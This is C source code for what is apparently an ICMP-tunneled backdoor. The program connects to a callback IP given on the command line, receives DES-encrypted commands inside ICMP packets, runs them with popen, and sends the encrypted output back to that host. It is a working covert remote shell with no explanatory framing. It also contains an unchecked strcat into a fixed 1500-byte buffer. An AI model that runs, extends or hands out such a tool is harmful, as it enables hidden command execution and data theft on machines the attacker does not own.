#include <stdio.h>
#include <unistd.h>
#include <string.h>
#include "net/icmp_send.h"
#include "net/icmp_recv.h"
#include "crypto/des.h"


void exec_cmd(const unsigned char *cmd, unsigned char *output) {
    FILE *cmd_file = popen(cmd, "r");
    char buff[20] = {0};
    while(fgets(buff, sizeof(buff), cmd_file))
        strcat(output, buff);
}


int main(int argc, char *argv[]) {
    char *target_ip;

    if (argc < 2) {
        printf("not found callback ip");
        exit(-1);
    }
    target_ip = argv[1];
	icmp_send_socket_init(target_ip);
    icmp_recv_socket_init();

	// recv data
	unsigned char recv_cipher_buff[1500];
    int recv_buff_size;
	// decrypt data
	unsigned char plain_buff[1500];
	int plain_len;
	// cmd output data
	unsigned char cmd_output[1500];
	// encrypt cmd output
	unsigned char send_buff[1500] = {0};
	int send_buff_size = 0;

	// main loop, recv client icmp request
	while(1) {
		memset(recv_cipher_buff, 0, sizeof(recv_cipher_buff));
		recv_buff_size = 0;	
    	recv_icmp(recv_cipher_buff, &recv_buff_size);
		// not recv valid data
		if (recv_buff_size == 0) {
			continue;
		}
    	// printf("recv done.\n");
    	// printf("total size: %d\n", recv_buff_size);
    	// fwrite(recv_cipher_buff, 1, recv_buff_size, stdout);
		memset(plain_buff, 0, sizeof(plain_buff));
		plain_len = 0;
		decrypt_msg(recv_cipher_buff, recv_buff_size, plain_buff, &plain_len);

		printf("command: %s\n", plain_buff);
		memset(cmd_output, 0, sizeof(cmd_output));
		exec_cmd(plain_buff, cmd_output);
		printf("output %d : %s", strlen(cmd_output), cmd_output);

		sleep(0.5);
		// printf("begin to send icmp.\n");
		// send

		memset(send_buff, 0, sizeof(send_buff));
		send_buff_size = 0;
		encrypt_msg(cmd_output, strlen(cmd_output), send_buff, &send_buff_size);

		// printf("send %d bytes\n", send_buff_size);
		send_icmp(send_buff, send_buff_size);
		printf("send %d bytes\n", send_buff_size);
	}

    return 0;
}
